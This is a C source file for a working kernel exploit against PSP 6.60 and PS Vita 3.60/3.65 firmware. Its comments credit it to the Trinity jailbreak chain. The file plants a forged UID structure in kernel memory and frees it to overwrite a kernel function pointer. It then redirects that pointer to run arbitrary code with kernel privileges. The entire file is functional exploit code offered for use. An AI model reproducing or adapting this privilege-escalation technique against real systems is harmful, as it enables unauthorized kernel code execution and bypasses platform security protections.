#include <pspdebug.h>
#include <pspctrl.h>
#include <pspsdk.h>
#include <pspiofilemgr.h>
#include <psputility.h>
#include <psputility_htmlviewer.h>
#include <psploadexec.h>
#include <psputils.h>
#include <psputilsforkernel.h>
#include <pspsysmem.h>
#include <psppower.h>
#include <string.h>

#include "macros.h"
#include "globals.h"
#include "functions.h"
#include "kxploit.h"

/*
SceUID kernel exploit and read-only exploit by qwikrazor87.
Part of Trinity exploit chain by thefl0w.
Put together by Acid_Snake and meetpatty.
*/

#define LIBC_CLOCK_OFFSET_660  0x88014400
#define LIBC_CLOCK_OFFSET_360  0x88014D80
#define LIBC_CLOCK_OFFSET_365  0x88014D00
#define SYSMEM_SEED_OFFSET_365 0x88014E38

#define FAKE_UID_OFFSET        0x80

static int libc_clock_offset = 0;
static u32 jump_ptr = 0;

int stubScanner360(UserFunctions* tbl){
    return 0;
}

/*
FakeUID kxploit
*/
int doExploit360(void) {

    int res;
    u32 seed = 0;

    if (test_val){
      if (test_val == 0x8F154E38){
        seed = readKram(SYSMEM_SEED_OFFSET_365);
        libc_clock_offset = LIBC_CLOCK_OFFSET_365;
        //PRTSTR("Vita 3.65");
      }
      else if (test_val == 0x8FBF003C){
        libc_clock_offset = LIBC_CLOCK_OFFSET_660;
        //PRTSTR("PSP 6.60");
      }
      else {
        //PRTSTR("Vita 3.60");
        libc_clock_offset = LIBC_CLOCK_OFFSET_360;
      }
    }

    // Allocate dummy block to improve reliability
    char dummy[32];
    memset(dummy, 'a', sizeof(dummy));
    SceUID dummyid;
    for (int i=0; i<10; i++)
      dummyid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, dummy, PSP_SMEM_High, 0x10, NULL);

    // we can use whatever memory allocated by dummy block to inject some code, thus not needing to rely on hardcoded pointers
    jump_ptr = g_tbl->KernelGetBlockHeadAddr(dummyid) + 4;

    // we can calculate the address of dummy block via its UID and from there calculate where the next block will be
    u32 dummyaddr = 0x88000000 + ((dummyid >> 5) & ~3);
    u32 newaddr = dummyaddr - FAKE_UID_OFFSET;
    SceUID uid = (((newaddr & 0x00ffffff) >> 2) << 7) | 0x1;
    SceUID encrypted_uid = uid ^ seed; // encrypt UID with seed, if there's none then A^0=A

    // grab some data from dummy UID block to implant into our fake UID block, this removes some hardcoding and improves reliability
    u32 type_uid = readKram(dummyaddr+8);
    u32 uid_name = readKram(dummyaddr+16);
    u32 t1 = readKram(dummyaddr+24);
    u32 t2 = readKram(dummyaddr+28);

    // Plant UID data structure into kernel as string
    u32 string[] = { libc_clock_offset - 4, KERNELIFY(jump_ptr), type_uid, encrypted_uid, uid_name, 0x1010070A, t1, t2, 0};
    SceUID plantid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, (char *)string, PSP_SMEM_High, 0x10, NULL);

    g_tbl->KernelDcacheWritebackAll();

    // check that the fake UID block has been planted where we expect
    u32 test = readKram(newaddr+8);
    if (test != type_uid) return 0xDEADBEEF;

    // backup data so we can restore later
    patch_addr = libc_clock_offset;
    patch_instr = readKram(libc_clock_offset);

    // Overwrite function pointer at LIBC_CLOCK_OFFSET with 0x88888888
    res = g_tbl->KernelFreePartitionMemory(uid);

    g_tbl->KernelDcacheWritebackAll();

   
    if (res < 0) return res;

    return 0;
}

void executeKernel360(u32 kernelContentFunction){
  // Make a jump to kernel function
  _sw(JUMP(KERNELIFY(kernelContentFunction)), jump_ptr);
  _sw(NOP, jump_ptr+4);
  g_tbl->KernelDcacheWritebackAll();

  // Execute kernel function
  g_tbl->KernelLibcClock();
}
